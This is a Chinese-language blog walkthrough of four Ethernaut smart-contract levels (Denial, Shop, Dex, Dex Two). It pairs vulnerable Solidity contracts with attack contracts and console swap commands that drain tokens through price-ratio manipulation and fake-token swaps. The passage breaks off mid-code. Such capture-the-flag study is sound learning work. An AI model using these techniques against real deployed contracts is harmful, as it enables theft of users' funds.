<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#222"><meta name="generator" content="Hexo 4.2.0"><link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico"><link rel="mask-icon" href="/images/favicon.ico" color="#222"><link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css"><script id="hexo-configurations">var NexT=window.NexT||{},CONFIG={hostname:"yalexin.gitee.io",root:"/",scheme:"Gemini",version:"7.7.1",exturl:!1,sidebar:{position:"left",display:"post",padding:18,offset:12,onmobile:!0},copycode:{enable:!0,show_result:!0,style:"mac"},back2top:{enable:!0,sidebar:!1,scrollpercent:!0},bookmark:{enable:!1,color:"#222",save:"auto"},fancybox:!0,mediumzoom:!1,lazyload:!1,pangu:!1,comments:{style:"tabs",active:null,storage:!0,lazyload:!1,nav:null},algolia:{hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}},localsearch:{enable:!1,trigger:"auto",top_n_per_article:1,unescape:!1,preload:!1},motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},path:"search.xml"}</script><meta name="description" content="原文再续，书接上回，本文继续闯关，本次我们来完成剩余所有关卡。"><meta property="og:type" content="article"><meta property="og:title" content="【Ethernaut闯关录】下篇"><meta property="og:url" content="https://yalexin.gitee.io/2023/03/31/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%8B%E7%AF%87/index.html"><meta property="og:site_name" content="黄阿信"><meta property="og:description" content="原文再续，书接上回，本文继续闯关，本次我们来完成剩余所有关卡。"><meta property="og:locale" content="zh_CN"><meta property="article:published_time" content="2023-03-31T02:41:28.000Z"><meta property="article:modified_time" content="2023-03-31T02:50:21.580Z"><meta property="article:author" content="YaleXin"><meta property="article:tag" content="Solidity"><meta property="article:tag" content="Web3.0"><meta name="twitter:card" content="summary"><link rel="canonical" href="https://yalexin.gitee.io/2023/03/31/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%8B%E7%AF%87/"><script id="page-configurations">CONFIG.page={sidebar:"",isHome:!1,isPost:!0}</script><title>【Ethernaut闯关录】下篇 | 黄阿信</title><noscript><style>.sidebar-inner,.use-motion .brand,.use-motion .collection-header,.use-motion .comments,.use-motion .menu-item,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.use-motion .logo-line-before i{left:initial}.use-motion .logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage"><div class="container use-motion"><div class="headband"></div><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-container"><div class="site-nav-toggle"><div class="toggle" aria-label="切换导航栏"><span class="toggle-line toggle-line-first"></span><span class="toggle-line toggle-line-middle"></span><span class="toggle-line toggle-line-last"></span></div></div><div class="site-meta"><div><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">黄阿信</span><span class="logo-line-after"><i></i></span></a></div><p class="site-subtitle">要么改变世界，要么适应世界。</p></div><div class="site-nav-right"><div class="toggle popup-trigger"></div></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-fw fa-home"></i> 首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i> 标签<span class="badge">118</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i> 分类<span class="badge">13</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i> 归档<span class="badge">125</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook/" rel="section"><i class="fa fa-fw fa-book"></i> 留言板</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-fw fa-link"></i> 友链</a></li></ul></nav></div></header><div class="back-to-top"><i class="fa fa-arrow-up"></i> <span>0%</span></div><div class="reading-progress-bar"></div><main class="main"><div class="main-inner"><div class="content-wrap"><div class="content"><div class="posts-expand"><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://yalexin.gitee.io/2023/03/31/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%8B%E7%AF%87/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/uploads/cat_mouse.jpg"><meta itemprop="name" content="YaleXin"><meta itemprop="description" content="学渣一枚"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="黄阿信"></span><header class="post-header"><h1 class="post-title" itemprop="name headline"> 【Ethernaut闯关录】下篇</h1><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建时间：2023-03-31 10:41:28 / 修改时间：10:50:21" itemprop="dateCreated datePublished" datetime="2023-03-31T10:41:28+08:00">2023-03-31</time></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">网络攻防</span></a></span></span><span id="/2023/03/31/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%8B%E7%AF%87/" class="post-meta-item leancloud_visitors" data-flag-title="【Ethernaut闯关录】下篇" title="阅读次数"><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">阅读次数：</span><span class="leancloud-visitors-count"></span></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">本文字数：</span> <span>38k</span></span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="fa fa-clock-o"></i></span> <span class="post-meta-item-text">阅读时长 &asymp;</span> <span>34 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><p>原文再续，书接上回，本文继续闯关，本次我们来完成剩余所有关卡。<a id="more"></a></p><h2 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    address public partner; &#x2F;&#x2F; withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address public constant owner &#x3D; address(0xA9E);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address &#x3D;&gt; uint) withdrawPartnerBalances; &#x2F;&#x2F; keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner &#x3D; _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amountToSend &#x3D; address(this).balance &#x2F; 100;</span><br><span class="line">        &#x2F;&#x2F; perform a call without checking return</span><br><span class="line">        &#x2F;&#x2F; The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call&#123;value:amountToSend&#125;(&quot;&quot;);</span><br><span class="line">        payable(owner).transfer(amountToSend);</span><br><span class="line">        &#x2F;&#x2F; keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn &#x3D; block.timestamp;</span><br><span class="line">        withdrawPartnerBalances[partner] +&#x3D;  amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; allow deposit of funds</span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; convenience function</span><br><span class="line">    function contractBalance() public view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件</strong>：阻止合约所有者通关调用<code>withdraw()</code>函数取回资金。</p><p>要想阻止其转账，貌似只有从<code>call</code>和<code>transfer</code>处入手，但是对于<code>owner</code>变量和<code>amountToSend</code>我们无法控制，因此我们只能从<code>call</code>入手，该函数调用的地址<code>partner</code>是我们可以控制的，因此我们可以尝试利用该外部调用，触发一个<code>revert</code>操作。我原本想部署一个合约，然后在<code>fallback</code>函数中<code>revert</code>的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fallback()external&#123;</span><br><span class="line">        revert(&#39;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过最终没有通关，网上找了一个</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line"></span><br><span class="line">    address public target;</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public payable &#123;</span><br><span class="line">        target&#x3D;_addr;</span><br><span class="line">        target.call(abi.encodeWithSignature(&quot;setWithdrawPartner(address)&quot;, address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fallback() external payable &#123;</span><br><span class="line">        assert(false);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>依旧没有通关！</strong></p><h2 id="Shop"><a href="#Shop" class="headerlink" title="Shop"></a>Shop</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">  function price() external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Shop &#123;</span><br><span class="line">  uint public price &#x3D; 100;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  function buy() public &#123;</span><br><span class="line">    Buyer _buyer &#x3D; Buyer(msg.sender);</span><br><span class="line"></span><br><span class="line">    if (_buyer.price() &gt;&#x3D; price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold &#x3D; true;</span><br><span class="line">      price &#x3D; _buyer.price();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件</strong>：将<code>isSold</code>变量设置为<code>true</code>同时将<code>price</code>减小。</p><p>本关卡实际上和关卡【Elevator】的解法差不多的。但是不同之处是这里的<code>price</code>是用<code>view</code>进行修饰。</p><blockquote><p>view修饰的函数，只读取状态，但不修改状态</p><p>pure修饰的函数，既不读取也不修改状态。</p><p>这里的修改状态，是指：修改状态变量、触发事件、创建合约、使用<code>selfdestruct</code>、通过<code>call</code>发送以太币、使用<code>call</code>调用任何没有被标记为<code>view</code>或者<code>pure</code>的函数、使用低级<code>call</code>、使用包含opcode的内联汇编。</p></blockquote><p>在关卡【Elevator】中，我们通过在合约中设置一个变量来区分是第几次调用，而本关卡已经无法继续使用该方法了，因为我们将来实现的<code>price()</code>函数将不能够修改状态变量。</p><p>但是仔细想想，我们虽然不能通过本地合约中的变量来区分是第几次调用，但是不妨碍我们访问外部合约中的变量来确定啊，实际上我们可以通过判断<code>Shop</code>合约中的<code>isSold</code>变量来判断这是第几次调用，不过得使用<code>staticcall</code>，该函数不会改变状态：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">contract Buyer &#123;</span><br><span class="line">    address public instance;</span><br><span class="line">    constructor(address _instance)&#123;</span><br><span class="line">    	instance &#x3D; _instance;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack()public&#123;</span><br><span class="line">    	 (bool success, bytes memory returnedData) &#x3D; instance.call&#123;gas:100000&#125;(</span><br><span class="line">    	 	abi.encodeWithSignature(&quot;buy()&quot;)</span><br><span class="line">    	 );</span><br><span class="line">		 require(success);</span><br><span class="line">    &#125;</span><br><span class="line">    function price() external view returns (uint)&#123;</span><br><span class="line">  		(bool success, bytes memory returnedData) &#x3D; instance.staticcall(</span><br><span class="line">    		abi.encodeWithSignature(&quot;isSold()&quot;)</span><br><span class="line">    	);</span><br><span class="line">		require(success);</span><br><span class="line">    	bool isSold &#x3D; abi.decode(returnedData, (bool));</span><br><span class="line">        if(isSold)&#123;</span><br><span class="line">    		return 0;</span><br><span class="line">    	&#125;else&#123;</span><br><span class="line">    	return 100;</span><br><span class="line">    	&#125;</span><br><span class="line">  	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Dex"><a href="#Dex" class="headerlink" title="Dex"></a>Dex</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;</span><br><span class="line">import &#39;openzeppelin-contracts-08&#x2F;access&#x2F;Ownable.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Dex is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 &#x3D; _token1;</span><br><span class="line">    token2 &#x3D; _token2;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function addLiquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require((from &#x3D;&#x3D; token1 &amp;&amp; to &#x3D;&#x3D; token2) || (from &#x3D;&#x3D; token2 &amp;&amp; to &#x3D;&#x3D; token1), &quot;Invalid tokens&quot;);</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;&#x3D; amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount &#x3D; getSwapPrice(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))&#x2F;IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableToken(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableToken(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableToken is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex &#x3D; dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner !&#x3D; _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件</strong>：盗走合约中的两个代币之一即可。</p><p>该合约中的函数<code>swap()</code>主要是实现给其他用户进行交换代币，然后通过<code>getSwapPrice</code>实现类似“汇率”的功能，即如果合约拥有的两种代币余额假若不同，则调用方需要支付的代币数目就会和得到的代币（当然这两种代币是不同的）数目不一样，问题就出在“汇率”的计算，因为该值等于合约拥有的两种代币余额的比值，假设两种代币中，合约拥有数量较少的代币为<code>A</code>，较多的是<code>B</code>，那么我们将<code>A</code>作为<code>from_token</code>，那么我就可以获得比<code>amont</code>还多的代币<code>B</code>（因为比值大于1），并保证调用<code>swap</code>后，合约拥有这两种代币的数量大小关系发生改变，接着我们就可以更换<code>from_token</code>，继续调用，直至最后达到合约拥有某个代币的数量为0，例如我们先用10个<code>token1</code>换取10个<code>token2</code>，，此时，合约和我们的各种代币余额如下：</p><table><thead><tr><th></th><th>token1</th><th>token2</th></tr></thead><tbody><tr><td>player</td><td>0</td><td>20</td></tr><tr><td>contract</td><td>110</td><td>90</td></tr></tbody></table><p>然后用20个<code>token2</code>换取<code>token1</code>，得到数量为$20*\frac{110}{90}$的<code>token1</code></p><table><thead><tr><th></th><th>token1</th><th>token2</th></tr></thead><tbody><tr><td>player</td><td>24</td><td>0</td></tr><tr><td>contract</td><td>86</td><td>110</td></tr></tbody></table><p>不断重复上述过程，不过在此之前要先授权：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(instance, <span class="number">500</span>)</span><br></pre></td></tr></table></figure><p>然后按照上面的逻辑，不断交换两种<code>token</code>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.swap(<span class="string">'0x0ED5115953919866C5ED60f1fb44baBC356B5132'</span>, <span class="string">'0xc5e8b6e202a68a9C08BcF776138831D10A587714'</span>, <span class="number">10</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(<span class="string">'0xc5e8b6e202a68a9C08BcF776138831D10A587714'</span>, <span class="string">'0x0ED5115953919866C5ED60f1fb44baBC356B5132'</span>, <span class="number">20</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(<span class="string">'0x0ED5115953919866C5ED60f1fb44baBC356B5132'</span>, <span class="string">'0xc5e8b6e202a68a9C08BcF776138831D10A587714'</span>, <span class="number">24</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(<span class="string">'0xc5e8b6e202a68a9C08BcF776138831D10A587714'</span>, <span class="string">'0x0ED5115953919866C5ED60f1fb44baBC356B5132'</span>, <span class="number">30</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(<span class="string">'0x0ED5115953919866C5ED60f1fb44baBC356B5132'</span>, <span class="string">'0xc5e8b6e202a68a9C08BcF776138831D10A587714'</span>, <span class="number">41</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(<span class="string">'0xc5e8b6e202a68a9C08BcF776138831D10A587714'</span>, <span class="string">'0x0ED5115953919866C5ED60f1fb44baBC356B5132'</span>, <span class="number">45</span>)</span><br></pre></td></tr></table></figure><p>完成最后的命令后，双方<code>token</code>如下：</p><table><thead><tr><th></th><th>token1</th><th>token2</th></tr></thead><tbody><tr><td>player</td><td>110</td><td>20</td></tr><tr><td>contract</td><td>0</td><td>90</td></tr></tbody></table><p>至此，我们已经将合约的<code>token1</code>全部获取，达成通关条件！</p><h2 id="Dex-Two"><a href="#Dex-Two" class="headerlink" title="Dex Two"></a>Dex Two</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;</span><br><span class="line">import &#39;openzeppelin-contracts-08&#x2F;access&#x2F;Ownable.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract DexTwo is Ownable &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line"></span><br><span class="line">  function setTokens(address _token1, address _token2) public onlyOwner &#123;</span><br><span class="line">    token1 &#x3D; _token1;</span><br><span class="line">    token2 &#x3D; _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function add_liquidity(address token_address, uint amount) public onlyOwner &#123;</span><br><span class="line">    IERC20(token_address).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function swap(address from, address to, uint amount) public &#123;</span><br><span class="line">    require(IERC20(from).balanceOf(msg.sender) &gt;&#x3D; amount, &quot;Not enough to swap&quot;);</span><br><span class="line">    uint swapAmount &#x3D; getSwapAmount(from, to, amount);</span><br><span class="line">    IERC20(from).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    IERC20(to).approve(address(this), swapAmount);</span><br><span class="line">    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  function getSwapAmount(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class="line">    return((amount * IERC20(to).balanceOf(address(this)))&#x2F;IERC20(from).balanceOf(address(this)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address spender, uint amount) public &#123;</span><br><span class="line">    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);</span><br><span class="line">    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableTokenTwo is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex &#x3D; dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner !&#x3D; _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>通关条件：</strong>盗走合约中的两个代币。</p><p>这一关卡和上一关类似，只不过<code>swap</code>函数中，去掉了代币种类限制。也就是说，我们可以通关部署我们自己的代币，然后给我们player和合约<code>DexTwo</code>一定数量的代币，然后用新的代币换<code>token1</code>或者<code>token2</code>，即可实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;https:&#x2F;&#x2F;github.com&#x2F;OpenZeppelin&#x2F;openzeppelin-contracts&#x2F;blob&#x2F;master&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract AttackToken1 is ERC20 &#123;</span><br><span class="line">    constructor(address _player, address _instance) ERC20(&#39;AttackToken1&#39;, &#39;T1&#39;)&#123;</span><br><span class="line">        &#x2F;&#x2F; 我们分别给我们自己，以及合约 DexTwo 各一个token</span><br><span class="line">        &#x2F;&#x2F; 然后我们我们使用数量为 1 的该代币，即可换取其100个 token1</span><br><span class="line">        